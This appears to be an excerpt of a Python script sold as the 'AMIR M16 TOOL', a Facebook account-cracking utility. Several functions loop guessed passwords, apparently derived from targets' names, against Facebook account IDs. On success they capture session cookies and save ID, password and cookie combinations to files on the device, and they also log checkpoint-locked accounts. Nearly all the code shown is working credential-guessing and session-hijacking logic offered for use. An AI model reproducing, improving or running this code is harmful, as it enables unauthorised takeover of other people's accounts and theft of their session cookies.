...
print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mWELLCOM TO AMIR M16 TOOL...')
...
sys.stdout.write('\x1b]2; <[AMIR-M16]>\x07')
logo=(f"""\033[1;37m
\ .S_SSSs     .S_SsS_S.    .S   .S_sSSs    
.SS~SSSSS   .SS~S*S~SS.  .SS  .SS~YS%%b   
S%S   SSSS  S%S `Y' S%S  S%S  S%S   `S%b  
S%S    S%S  S%S     S%S  S%S  S%S    S%S  
S%S SSSS%S  S%S     S%S  S&S  S%S    d*S  
...
S*S    S*S  S*S     S*S  S*S  S*S    S%S  
S*S    S*S  S*S     S*S  S*S  S*S    S&S  
SSS    S*S  SSS     S*S  S*S  S*S    SSS  
       SP           SP   SP   SP          
       Y            Y    Y    Y           
                                          34m══════════════════════════════════════════════════
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mFACEBOK : \033[1;37MOHA 
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mGITHUB  : \033[1;37mAMIR-2
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mSERVICE : \033[1;37mPAID
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;32mVERSION : \033[1;37m3.21
\033[1;34m═════════════════════════════════════════
\033[1;32m[\033[1;31m-\033[1;32m] \033[1;31mCloning ids Saved in AMIR folder
\033[1;34m═════════════════════════════════════════""")
def linex():
    print('\033[1;34m═════════════════════════════════════════')
def clear():
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[AMIR-M1]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/AMIR_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AMIR_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<[AMIR-CP]> '+ids+' | '+pas+'\033[1;97m')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[AMIR-M2]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[AMIR-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-🇩🇿] :\033[1;37m "+cookie)           
                                        open('/sdcard/AMIR_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AMIR_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[AMIR-M3]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m <[AMIR-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/AMIR_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AMIR_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m<[AMIR-M4]>×<[%s|\033[1;32mOK:-%s\033[1;37m]> \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
'Content-Length': '706'}
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m <[AMIR-OK]> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/AMIR_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AMIR_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                       
                                        oks.append(ids)              
                                        break                                                                         
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
...
def createip():
	...
	os.system('cd && cd MOHA ;python IP16.py')
#####_____END_____#####
